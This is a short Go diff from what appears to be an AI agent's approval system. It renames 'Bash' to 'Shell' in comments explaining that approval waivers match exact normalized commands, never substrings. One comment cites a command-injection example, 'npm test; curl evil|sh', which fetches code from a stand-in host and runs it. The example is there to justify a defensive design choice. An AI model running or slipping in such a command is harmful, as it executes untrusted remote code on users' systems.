@@ -15,7 +15,7 @@ import (
 // Matching is by NORMALIZED EXACT EQUALITY, never substring (CWE-863): a substring
 // match on a stored `npm test` would auto-allow `npm test; curl evil|sh`, an
 // authorization-escalation bypass. A waiver is ALWAYS a concrete per-call key (tool +
-// normalized command for Bash, tool + normalized args for any other tool) — it is
+// normalized command for Shell, tool + normalized args for any other tool) — it is
 // NEVER a blanket per-tool bypass.
 //
 // In-memory only: a waiver does NOT survive a process restart (the SAFE direction —
@@ -30,7 +30,7 @@ import (
 type waiverScope struct {
 	// Tool is the exact tool name the verdict approved (always set).
 	Tool string
-	// Key is the NORMALIZED authorization key: for Bash, the normalized command; for
+	// Key is the NORMALIZED authorization key: for Shell, the normalized command; for
 	// any other tool, the normalized raw args JSON. A waiver authorizes a candidate iff
 	// tool AND normalize(candidate key) EXACTLY equal this (no substring, no blanket).
 	Key string
@@ -46,8 +46,8 @@ func normalizeWaiverKey(s string) string {
 
 // matches reports whether this waiver authorizes a candidate (tool, key). It requires
 // an EXACT tool-name match AND an EXACT normalized-key match. There is NO empty-key
-// "matches any call" semantics — a non-Bash waiver matches only the exact same args,
-// and a Bash waiver only the exact same command.
+// "matches any call" semantics — a non-Shell waiver matches only the exact same args,
+// and a Shell waiver only the exact same command.
 func (s waiverScope) matches(tool, key string) bool {
 	return s.Tool == tool && s.Key == normalizeWaiverKey(key)
 }
@@ -93,7 +93,7 @@ func (h *WaiverHolder) arm(sessionID string, scope waiverScope) {
 // ArmFromApproval arms a waiver for sessionID from an approved call's (tool, key). It
 // is the SINGLE arming entry the Runner's LearnHookApproval calls: tool is always set
 // (a concrete approved call), and key is the call's concrete authorization key (the
-// Bash command, or the raw args JSON for any other tool) — NORMALIZED before storage
+// Shell command, or the raw args JSON for any other tool) — NORMALIZED before storage
 // so it compares exactly against a normalized candidate. A nil receiver is a no-op.
 func (h *WaiverHolder) ArmFromApproval(sessionID, tool, key string) {
 	h.arm(sessionID, waiverScope{Tool: tool, Key: normalizeWaiverKey(key)})
